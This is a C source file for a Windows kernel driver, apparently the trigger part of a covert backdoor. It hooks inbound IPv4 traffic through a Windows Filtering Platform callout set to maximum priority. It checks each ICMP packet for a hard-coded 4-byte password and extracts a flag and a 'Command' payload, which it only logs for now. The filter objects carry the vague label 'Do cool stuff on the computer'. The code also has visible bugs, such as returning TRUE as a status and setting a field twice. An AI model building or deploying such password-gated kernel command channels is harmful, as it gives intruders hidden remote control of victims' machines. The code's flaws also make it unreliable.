#include "Trigger.h"         // Include the trigger header file
#include "Config.h"

NTSTATUS WfpInit(PDRIVER_OBJECT driverObject) {
    engineHandle = NULL; // Initialize to NULL (just precaution)
    filterDeviceObject = NULL; // Initialize to NULL (just precaution)

    // Create a device object (used in the callout registration)
    NTSTATUS status = IoCreateDevice(driverObject, 0, NULL, FILE_DEVICE_UNKNOWN, 0, FALSE, &filterDeviceObject);
    if (!NT_SUCCESS(status)) {
        KdPrint(("[PER Driver] Failed to create the filter device object (0x%X).\n", status));
        return status;
    }

    // Open a session to the filter engine
    status = FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engineHandle);
    if (!NT_SUCCESS(status)) {
        KdPrint(("[PER Driver] Failed to open the filter engine (0x%X).\n", status));
        return status;
    }
    
    status = CalloutRegister();
    if (!NT_SUCCESS(status)) {
        KdPrint(("[PER Driver] Failed to register the filter callout (0x%X).\n", status));
        return status;
    }

    // Add the callout to the system
    status = CalloutAdd();
    if (!NT_SUCCESS(status)) {
        KdPrint(("[PER Driver] Failed to add the filter callout (0x%X).\n", status));
        return status;
    }

    // Add a sublayer to the system
    status = SublayerAdd();
    if (!NT_SUCCESS(status)) {
        KdPrint(("[PER Driver] Failed to add the sublayer (0x%X).\n", status));
        return status;
    }

    // Add a filtering rule to the added sublayer
    status = FilterAdd();
    if (!NT_SUCCESS(status)) {
        KdPrint(("[PER Driver] Failed to add the filter (0x%X).\n", status));
        return status;
    }

    return TRUE;

}

NTSTATUS CalloutRegister() {
    registerCalloutId = 0;

    FWPS_CALLOUT callout = {
      .calloutKey = CALLOUT_GUID,    // Unique GUID that identifies the callout (previously defined)
      .flags = 0,               // None
      .classifyFn = CalloutFilter,   // Callout function used to process network data (our ICMP packets)
      .notifyFn = CalloutNotify,   // Callout function used to receive notifications from the filter engine (MUST be defined)
      .flowDeleteFn = NULL             // Callout function used to process terminated data (does't need to be defined)
    };

    return FwpsCalloutRegister(filterDeviceObject, &callout, &registerCalloutId);
}

VOID CalloutFilter(
    const FWPS_INCOMING_VALUES* inFixedValues,
    const FWPS_INCOMING_METADATA_VALUES* inMetaValues,
    void* layerData,
    const void* classifyContext,
    const FWPS_FILTER* filter,
    UINT64 flowContext,
    FWPS_CLASSIFY_OUT* classifyOut
) {
    UNREFERENCED_PARAMETER(classifyContext);
    UNREFERENCED_PARAMETER(filter);
    UNREFERENCED_PARAMETER(flowContext);
    UNREFERENCED_PARAMETER(classifyOut);

    if (!layerData)
        return;

    if (inFixedValues->incomingValue[FWPS_FIELD_DATAGRAM_DATA_V4_IP_PROTOCOL].value.uint8 != IPPROTO_ICMP || inMetaValues->ipHeaderSize <= 0)
        return;

    NET_BUFFER_LIST* fragmentList = (NET_BUFFER_LIST*)layerData;
    NET_BUFFER *firstFragment = NET_BUFFER_LIST_FIRST_NB(fragmentList);

    ULONG  icmpLength    = firstFragment->DataLength;  // Size of the ICMP packet
    UINT32 dataLength    = icmpLength - 8;             // ICMP data size    = ICMP packet size - ICMP header size    
    UINT32 payloadLength = dataLength - 4 - 1;         // ICMP payload size = ICMP packet size - ICMP header size - 4 (password size) - 1 (reserved flag size) 

    if (dataLength <= 4 || dataLength >= 1473) {
        KdPrint(("[PER Driver] Wrong data length in ICMP, skipping"));
        return;
    }

    // Allocate memory for the ICMP packet
    // TODO: free memory?
    PVOID icmpBuffer = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)icmpLength, ALLOC_TAG_NAME);
    if (!icmpBuffer)
        return;

    // Copy the packet
    PBYTE icmpPacket = (PBYTE)NdisGetDataBuffer(firstFragment, (ULONG)icmpLength, icmpBuffer, 1, 0);
    if (!icmpPacket)
        goto freeBuffer;

    BYTE icmpPassword[4] = {0};
    RtlCopyMemory(icmpPassword, &icmpPacket[8], 4);

    if (!RtlEqualMemory(icmpPassword, PASSWORD, 4)) {
        KdPrint(("[PER Driver] Invalid password in ICMP packet"));
        goto freeBuffer;
    }

    BYTE icmpFlag = icmpPacket[12];

    // Allocate for ICMP payload
    LPSTR icmpPayload = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)(payloadLength + 1), ALLOC_TAG_NAME); 
    if (!icmpPayload)
        goto freeBuffer;

    // Extract payload
    RtlZeroMemory(icmpPayload, payloadLength + 1);
    RtlCopyMemory(icmpPayload, &icmpPacket[13], payloadLength);

    icmpPayload[payloadLength] = '\0';

    KdPrint(("[PER Driver] Password: {0x%x, 0x%x, 0x%x, 0x%x}", icmpPassword[0], icmpPassword[1], icmpPassword[2], icmpPassword[3]));
    KdPrint(("[PER Driver] Flag: 0x%x", icmpFlag));
    KdPrint(("[PER Driver] Command: %s", icmpPayload));

    ExFreePoolWithTag((PVOID)icmpPayload, ALLOC_TAG_NAME);

freeBuffer:
    ExFreePoolWithTag((PVOID)icmpBuffer, ALLOC_TAG_NAME);
}

NTSTATUS CalloutNotify(
    FWPS_CALLOUT_NOTIFY_TYPE  notifyType,
    const GUID* filterKey,
    FWPS_FILTER* filter
) {
    UNREFERENCED_PARAMETER(notifyType);
    UNREFERENCED_PARAMETER(filterKey);
    UNREFERENCED_PARAMETER(filter);

    return STATUS_SUCCESS;
}

NTSTATUS CalloutAdd() {
    addCalloutId = 0;

    FWPM_CALLOUT callout = {
      .flags = 0,                                // None
      .displayData.name = L"PER Driver Callout",
      .displayData.description = L"Do cool stuff on the computer",
      .calloutKey = CALLOUT_GUID,                     // The GUID that uniquely identifies the callout (must match the registered FWPS_CALLOUT GUID)
      .applicableLayer = FWPM_LAYER_INBOUND_TRANSPORT_V4
    };

    return FwpmCalloutAdd(engineHandle, &callout, NULL, &addCalloutId);
}

NTSTATUS SublayerAdd() {

    FWPM_SUBLAYER sublayer = {
      .displayData.name = L"PER Driver Sublayer",
      .displayData.name = L"Do cool stuff on the computer",
      .subLayerKey = SUB_LAYER_GUID,         // Unique GUID that identifies the sublayer
      .weight = 65535                   // Max UINT16 value, higher weight means higher priority
    };

    return FwpmSubLayerAdd(engineHandle, &sublayer, NULL);
}

NTSTATUS FilterAdd() {
    filterId = 0;                                              // Initialize the filterId to 0
    UINT64      weightValue = 0xFFFFFFFFFFFFFFFF;                             // Max UINT64 value
    FWP_VALUE   weight = { .type = FWP_UINT64, .uint64 = &weightValue }; // Weight variable, higher weight means higher priority
    FWPM_FILTER_CONDITION conditions[1] = { 0 };                              // Filter conditions can be empty, we want to process every packet

    FWPM_FILTER filter = {
      .displayData.name = L"PER Driver Filter",
      .displayData.name = L"Do cool stuff on the computer",
      .layerKey = FWPM_LAYER_INBOUND_TRANSPORT_V4,  // Needs to work on the same layer as our added callout
      .subLayerKey = SUB_LAYER_GUID,                   // Unique GUID that identifies the sublayer, GUID needs to be the same as the GUID of the added sublayer
      .weight = weight,                           // Weight variable, higher weight means higher priority
      .numFilterConditions = 0,                                // Number of filter conditions (0 because conditions variable is empty)
      .filterCondition = conditions,                       // Empty conditions structure (we don't want to do any filtering)	
      .action.type = FWP_ACTION_CALLOUT_INSPECTION,    // We only want to inspect the packet (https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_action0)
      .action.calloutKey = CALLOUT_GUID                      // Unique GUID that identifies the callout, GUID needs to be the same as the GUID of the added callout
    };

    return FwpmFilterAdd(engineHandle, &filter, NULL, &filterId);
}

VOID Cleanup() {
    TermCalloutIds();
    TermWfpEngine();
    TermFilterDeviceObject();
}

VOID TermCalloutIds() {
    DbgPrint("Terminating callout identifiers.\n");

    if (engineHandle) {

        // Clear 'filterId' related data
        if (filterId) {
            FwpmFilterDeleteById(engineHandle, filterId);
            FwpmSubLayerDeleteByKey(engineHandle, &SUB_LAYER_GUID);
            filterId = 0;
        }

        // Clear 'addCalloutId' related data
        if (addCalloutId) {
            FwpmCalloutDeleteById(engineHandle, addCalloutId);
            addCalloutId = 0;
        }

        // Clear 'registerCalloutId' related data
        if (registerCalloutId) {
            FwpsCalloutUnregisterById(registerCalloutId);
            registerCalloutId = 0;
        }

    }
}

VOID TermWfpEngine() {
    DbgPrint("Terminating the filter engine handle.\n");

    if (engineHandle) {
        FwpmEngineClose(engineHandle);
        engineHandle = NULL;
    }
}

VOID TermFilterDeviceObject() {
    DbgPrint("Terminating the device object.\n");

    if (filterDeviceObject) {
        IoDeleteDevice(filterDeviceObject);
        filterDeviceObject = NULL;
    }
}